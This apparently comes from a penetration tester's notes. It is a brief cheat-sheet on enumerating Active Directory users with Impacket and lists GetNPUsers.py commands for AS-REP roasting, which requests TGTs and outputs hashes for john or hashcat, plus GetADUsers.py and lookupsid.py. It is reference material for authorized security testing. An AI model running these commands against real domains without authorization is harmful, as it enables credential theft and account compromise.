LDAP Enumeration Tools

### Impacket

Using that userne list generated from `ldapsearch`, we can use Impacket's `GetNPUsers.py` to see if we can get a user's TGT:
```
$ python3 GetNPUsers.py -dc-ip <target_IP> -request domain.local/ -userfile userlist.ldap -format john
```
or
```
$ GetADUsers.py -all <domain\User> -dc-ip <DC_IP>
```

You can simply change the -format flag to hashcat if you want to use hashcat. 

Or try with no password:
```
$ python3 GetNPUsers.py <domain/user> -request -no-pass -dc-ip <IP>
```

Impacket `lookupsid.py`:
```
$ /usr/share/doc/python3-impacket/examples/lookupsid.py userne:password@x.x.x.x
```


#### References: 

- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#most-common-paths-to-ad-compromise)
